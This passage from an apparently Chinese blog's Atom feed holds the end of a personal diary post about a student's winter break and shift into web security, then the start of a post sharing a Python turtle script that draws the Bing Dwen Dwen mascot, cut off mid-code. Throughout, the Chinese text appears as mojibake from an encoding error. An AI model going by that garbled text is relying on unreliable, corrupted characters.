æ–°çŸ¥è¯†ï¼Œè¢«ä»Šå¤©åˆ·äº†å¤šå°‘é“é¢˜æ‰€æ·±æ·±ç¦é”¢æ—¶ï¼Œæˆ‘çš„ç›®çš„å˜äº†ï¼Œå¿ƒæƒ…å˜äº†ï¼Œæƒ…ç»ªè‡ªç„¶ä¹Ÿå˜äº†ã€‚å½“åˆï¼Œæˆ‘å…¶å®å­¦è¿™äº›çš„åˆè¡·ï¼Œä¸æ˜¯ä»€ä¹ˆæˆ‘è¦æ‰¾å·¥ä½œï¼Œæˆ‘è¦å»å¤§å‚ï¼Œæˆ‘ä»å¤§å­¦ç¬¬ä¸€å¤©ï¼Œå› ä¸ºé«˜è€ƒç³Ÿç³•é€äº†çš„æˆç»©ï¼Œå°±ä¸‹å®šå†³å¿ƒè¦è€ƒç ”çš„ã€‚è€Œæ˜¯åœ¨ä¹‹å‰çš„é¡¹ç›®ä¸­æ‰€å¯¹äºwebçš„æƒŠè‰³ï¼Œè‡³ä»Šæˆ‘ç”¨grafanaæ­çš„ç¬¬ä¸€ä¸ªç«™ï¼Œè¿˜åœ¨é‚£æŒ‚ç€ï¼Œä¾ç„¶å¯¹äºåœ¨æµè§ˆå™¨è¾“å…¥ipé‚£ä¸€åˆ»ï¼Œæ˜¾ç°åœ¨æˆ‘çœ¼å‰çš„ç”»é¢æ‰€æƒŠå–œã€‚å½“æ—¶æˆ‘ä¸‹å®šå†³å¿ƒæ”¾å¼ƒå­¦äº†ä¸€å¹´çš„é€†å‘ï¼Œå»å­¦webã€‚</p><p>â€‹        å…¶å®æœ‰æ—¶å€™ï¼Œæˆ‘ä¹Ÿæƒ³å‡ºå»çœ‹ä¸€åœºç”µå½±ï¼Œç„¶åç—›ç—›å¿«å¿«å–ä¸ªå¤§é†‰ï¼Œå›å®¶æ²‰æ²‰ç¡ä¸Šä¸€è§‰ã€‚ä½†ç°åœ¨ä¸è¡Œï¼Œæˆ‘æœ‰æˆ‘çš„ç†æƒ³ï¼Œæˆ‘ä¹Ÿè¿˜æ²¡æœ‰èƒ½åŠ›å»æŒ–åˆ°è¶³å¤Ÿç»™åŠ›çš„æ¼æ´ï¼ŒSkyMirroræˆ‘ä¸æƒ³æ˜¯ä¸€ä¸ªæ²¡è¿›è¿‡çº¿ä¸‹çš„èŒæ–°é˜Ÿä¼ï¼Œæˆ‘å­¦æ ¡æ˜¯ä»€ä¹ˆæ‰€è°“çš„å¼±æ ¡ã€‚æˆ‘çš„ç›®å…‰åˆä¸å¾—ä¸çœ‹å‘ä¸¤å¹´ä»¥åçš„é‚£åœºè€ƒç ”ï¼Œå¾ˆå‰²è£‚ï¼Œæœ¬å¤œç½‘æŠ‘äº‘çš„æ—¶å€™ï¼Œæ€»ä¼šæƒ³åˆ°è¿™äº›äº‹æƒ…ï¼Œä½†å¥½åœ¨äººæ˜¯ç§¯æå‘ä¸Šçš„ï¼Œæ˜å¤©é†’æ¥ä»€ä¹ˆåæƒ…ç»ªéƒ½æ¶ˆå¤±äº†ã€‚</p><blockquote><p>æ‹¿å‡ºåŠå°æ—¶ï¼Œå†™ä¸€ä¸ªå®Œå…¨è·Ÿç€æƒ…ç»ªèµ°ï¼Œæƒ³åˆ°å“ªå†™åˆ°å“ªçš„æ–‡ç« ï¼Œä¸çŸ¥é“ä¸€å¹´åï¼Œä¸¤å¹´åï¼Œç”šè‡³äº”å¹´åå¹´åï¼Œçœ‹çœ‹ç°åœ¨æˆ‘æ‰€æƒ³çš„ï¼Œæ‰€åšçš„æ˜¯ä»€ä¹ˆæ ·çš„æ„Ÿè§‰ï¼Œè¿™ä¹Ÿæ˜¯åšå®¢çš„ä¾¿åˆ©ï¼Œæˆ‘èƒ½å³åˆ»çš„å†™ä¸‹æˆ‘å½“ä¸‹çš„æƒ…ç»ªï¼Œä¸”èƒ½å¤Ÿé•¿æœŸä¿å­˜ã€‚</p><p>å†™åˆ°è¿™æœ¬æ¥ç¡ä¸ç€è§‰çš„æˆ‘ä¹Ÿå›°äº†ï¼Œæ™šå®‰å¥½æ¢¦ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å’³ï¼Œå¯’å‡&quot;&gt;&lt;a href=&quot;#å’³ï¼Œå¯’å‡&quot; class=&quot;headerlink&quot; title=&quot;å’³ï¼Œå¯’å‡&quot;&gt;&lt;/a&gt;å’³ï¼Œå¯’å‡&lt;/h1&gt;&lt;p&gt;â€‹        ä¸çŸ¥ä¸è§‰ï¼Œè¿™ä¸ªå¯’å‡åˆè¦è¿‡å»äº†ï¼Œå¤§å­¦çš„ç¬¬äºŒä¸ªå¯’å‡ï¼ŒåŠå¤œç¡ä¸ç€è§‰ï¼Œç´¢æ€§çˆ¬èµ·æ¥ï¼Œæ”¾ä¸€é¦–è½»éŸ³ä¹è®°å½•ä¸€ä¸‹å½“ä¸‹çš„æ„Ÿå—ã€‚</summary>
      
    
    
    
    <category term="é—²èŠ" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="é—²èŠ" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦(turtle)~</title>
    <link href="http://websec.space/2022/02/10/%E9%80%81%E4%BD%A0%E4%B8%80%E4%B8%AA%E5%86%B0%E5%A2%A9%E5%A2%A9%E5%93%A6/"/>
    <id>http://websec.space/2022/02/10/%E9%80%81%E4%BD%A0%E4%B8%80%E4%B8%AA%E5%86%B0%E5%A2%A9%E5%A2%A9%E5%93%A6/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-10T06:12:42.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦-turtle"><a href="#é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦-turtle" class="headerlink" title="é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦(turtle)~"></a>é€ä½ ä¸€ä¸ªå†°å¢©å¢©å“¦(turtle)~</h1><p>ä»Šå¤©åœ¨ç©ºé—´å‘äº†ä¸€ä¸ªè¯´è¯´ï¼Œæ˜¯ç”¨pythonçš„turtleåº“ç”»çš„ä¸€ä¸ªå†°å¢©å¢©ã€‚</p><p>å¥½å¤šäººè·‘æ¥é—®æˆ‘è¦æºç ï¼Œæˆ‘å…ˆè¯´æ¸…æ¥šæ¥æºï¼Œç¬¬ä¸€ç‚¹è¯´æ˜è¿™ä¸ªå†°å¢©å¢©çš„ä»£ç ä¸æ˜¯æˆ‘å†™çš„ï¼Œåœ¨ç¾¤é‡Œä¸€ä¸ªç¾¤å‹è¯´è¿™ä¸ªpythonä»£ç è·‘ä¸é€šï¼Œæˆ‘å¤åˆ¶äº†ä¸€ä¸‹ï¼Œæˆ‘å½“æ—¶åœ¨èŠå¤©æ¡†çœ‹è§ï¼Œç¬¬ä¸€æ„Ÿè§‰ä»¥ä¸ºæ˜¯ç©ºæ ¼çš„é—®é¢˜ï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œä¸€çœ‹å°±æ˜¯ä¸ªturtleï¼Œæ²¡æœ‰ä»€ä¹ˆç©ºæ ¼çš„é—®é¢˜ï¼Œä¸”ä¸€ä¸‹å°±è¿è¡Œèµ·æ¥äº†ï¼Œå‘ç°æ˜¯ç”»å†°å¢©å¢©çš„å¾ˆæœ‰æ„æ€ã€‚ç›®å‰åªçŸ¥é“æ˜¯ä¸ªå¼€æºï¼Œä½†ä¸çŸ¥é“æ˜¯å“ªä½å¤§ä½¬å†™çš„ä»£ç ï¼Œå¦‚æœä¾µæƒç•™è¨€æˆ‘å°±æŠŠåšå®¢åˆ æ‰äº†ï¼Œï¼ˆå½“ç„¶è¿™ä¸ªå¹³æ—¶åªæœ‰æˆ‘è‡ªå·±çœ‹çš„åšå®¢ï¼‰</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line">import turtle</span><br><span class="line"></span><br><span class="line">turtle.title(&#x27;å†°å¢©å¢©&#x27;)</span><br><span class="line"></span><br><span class="line">turtle.speed(10)  # é€Ÿåº¦</span><br><span class="line"></span><br><span class="line"># å·¦æ‰‹</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(177, 112)</span><br><span class="line">turtle.pencolor(&quot;lightgray&quot;)</span><br><span class="line">turtle.pensize(3)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(80)</span><br><span class="line">turtle.circle(-45, 200)</span><br><span class="line">turtle.circle(-300, 23)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å·¦æ‰‹å†…</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(182, 95)</span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.pensize(1)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.setheading(95)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(-37, 160)</span><br><span class="line">turtle.circle(-20, 50)</span><br><span class="line">turtle.circle(-200, 30)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"># è½®å»“</span><br><span class="line"># å¤´é¡¶</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-73, 230)</span><br><span class="line">turtle.pencolor(&quot;lightgray&quot;)</span><br><span class="line">turtle.pensize(3)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(20)</span><br><span class="line">turtle.circle(-250, 35)</span><br><span class="line"># å·¦è€³</span><br><span class="line">turtle.setheading(50)</span><br><span class="line">turtle.circle(-42, 180)</span><br><span class="line"># å·¦ä¾§</span><br><span class="line">turtle.setheading(-50)</span><br><span class="line">turtle.circle(-190, 30)</span><br><span class="line">turtle.circle(-320, 45)</span><br><span class="line"># å·¦è…¿</span><br><span class="line">turtle.circle(120, 30)</span><br><span class="line">turtle.circle(200, 12)</span><br><span class="line">turtle.circle(-18, 85)</span><br><span class="line">turtle.circle(-180, 23)</span><br><span class="line">turtle.circle(-20, 110)</span><br><span class="line">turtle.circle(15, 115)</span><br><span class="line">turtle.circle(100, 12)</span><br><span class="line"># å³è…¿</span><br><span class="line">turtle.circle(15, 120)</span><br><span class="line">turtle.circle(-15, 110)</span><br><span class="line">turtle.circle(-150, 30)</span><br><span class="line">turtle.circle(-15, 70)</span><br><span class="line">turtle.circle(-150, 10)</span><br><span class="line">turtle.circle(200, 35)</span><br><span class="line">turtle.circle(-150, 20)</span><br><span class="line"># å³æ‰‹</span><br><span class="line">turtle.setheading(-120)</span><br><span class="line">turtle.circle(50, 30)</span><br><span class="line">turtle.circle(-35, 200)</span><br><span class="line">turtle.circle(-300, 23)</span><br><span class="line"># å³ä¾§</span><br><span class="line">turtle.setheading(86)</span><br><span class="line">turtle.circle(-300, 26)</span><br><span class="line"># å³è€³</span><br><span class="line">turtle.setheading(122)</span><br><span class="line">turtle.circle(-53, 160)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å³è€³å†…</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-130, 180)</span><br><span class="line">turtle.pencolor(&quot;black&quot;)</span><br><span class="line">turtle.pensize(1)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(120)</span><br><span class="line">turtle.circle(-28, 160)</span><br><span class="line">turtle.setheading(210)</span><br><span class="line">turtle.circle(150, 20)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å·¦è€³å†…</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(90, 230)</span><br><span class="line">turtle.setheading(40)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(-30, 170)</span><br><span class="line">turtle.setheading(125)</span><br><span class="line">turtle.circle(150, 23)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å³æ‰‹å†…</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-180, -55)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.setheading(-120)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(50, 30)</span><br><span class="line">turtle.circle(-27, 200)</span><br><span class="line">turtle.circle(-300, 20)</span><br><span class="line">turtle.setheading(-90)</span><br><span class="line">turtle.circle(300, 14)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å·¦è…¿å†…</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(108, -168)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(-115)</span><br><span class="line">turtle.circle(110, 15)</span><br><span class="line">turtle.circle(200, 10)</span><br><span class="line">turtle.circle(-18, 80)</span><br><span class="line">turtle.circle(-180, 13)</span><br><span class="line">turtle.circle(-20, 90)</span><br><span class="line">turtle.circle(15, 60)</span><br><span class="line">turtle.setheading(42)</span><br><span class="line">turtle.circle(-200, 29)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"># å³è…¿å†…</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-38, -210)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(-155)</span><br><span class="line">turtle.circle(15, 100)</span><br><span class="line">turtle.circle(-10, 110)</span><br><span class="line">turtle.circle(-100, 30)</span><br><span class="line">turtle.circle(-15, 65)</span><br><span class="line">turtle.circle(-100, 10)</span><br><span class="line">turtle.circle(200, 15)</span><br><span class="line">turtle.setheading(-14)</span><br><span class="line">turtle.circle(-200, 27)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å³çœ¼</span><br><span class="line"># çœ¼åœˆ</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-64, 120)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(40)</span><br><span class="line">turtle.circle(-35, 152)</span><br><span class="line">turtle.circle(-100, 50)</span><br><span class="line">turtle.circle(-35, 130)</span><br><span class="line">turtle.circle(-100, 50)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># çœ¼ç </span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-47, 55)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(25, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-45, 62)</span><br><span class="line">turtle.pencolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.fillcolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(19, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-45, 68)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(10, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-47, 86)</span><br><span class="line">turtle.pencolor(&quot;white&quot;)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(5, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å·¦çœ¼</span><br><span class="line"># çœ¼åœˆ</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(51, 82)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(120)</span><br><span class="line">turtle.circle(-32, 152)</span><br><span class="line">turtle.circle(-100, 55)</span><br><span class="line">turtle.circle(-25, 120)</span><br><span class="line">turtle.circle(-120, 45)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"># çœ¼ç </span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 60)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(24, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 64)</span><br><span class="line">turtle.pencolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.fillcolor(&quot;darkslategray&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(19, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 70)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(10, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(79, 88)</span><br><span class="line">turtle.pencolor(&quot;white&quot;)</span><br><span class="line">turtle.fillcolor(&quot;white&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(0)</span><br><span class="line">turtle.circle(5, 360)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># é¼»å­</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(37, 80)</span><br><span class="line">turtle.fillcolor(&quot;black&quot;)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(-8, 130)</span><br><span class="line">turtle.circle(-22, 100)</span><br><span class="line">turtle.circle(-8, 130)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å˜´</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-15, 48)</span><br><span class="line">turtle.setheading(-36)</span><br><span class="line">turtle.begin_fill()</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.circle(60, 70)</span><br><span class="line">turtle.setheading(-132)</span><br><span class="line">turtle.circle(-45, 100)</span><br><span class="line">turtle.end_fill()</span><br><span class="line"></span><br><span class="line"># å½©è™¹åœˆ</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-135, 120)</span><br><span class="line">turtle.pensize(5)</span><br><span class="line">turtle.pencolor(&quot;cyan&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-165, 150)</span><br><span class="line">turtle.circle(-130, 78)</span><br><span class="line">turtle.circle(-250, 30)</span><br><span class="line">turtle.circle(-138, 105)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-131, 116)</span><br><span class="line">turtle.pencolor(&quot;slateblue&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-160, 144)</span><br><span class="line">turtle.circle(-120, 78)</span><br><span class="line">turtle.circle(-242, 30)</span><br><span class="line">turtle.circle(-135, 105)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-127, 112)</span><br><span class="line">turtle.pencolor(&quot;orangered&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-155, 136)</span><br><span class="line">turtle.circle(-116, 86)</span><br><span class="line">turtle.circle(-220, 30)</span><br><span class="line">turtle.circle(-134, 103)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-123, 108)</span><br><span class="line">turtle.pencolor(&quot;gold&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-150, 136)</span><br><span class="line">turtle.circle(-104, 86)</span><br><span class="line">turtle.circle(-220, 30)</span><br><span class="line">turtle.circle(-126, 102)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(-120, 104)</span><br><span class="line">turtle.pencolor(&quot;greenyellow&quot;)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.setheading(60)</span><br><span class="line">turtle.circle(-145, 136)</span><br><span class="line">turtle.circle(-90, 83)</span><br><span class="line">turtle.circle(-220, 30)</span><br><span class="line">turtle.circle(-120, 100)</span><br><span class="line">turtle.penup()</span><br><span class="line"></span><br><span class="line"># çˆ±å¿ƒ</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(220, 115)</span><br><span 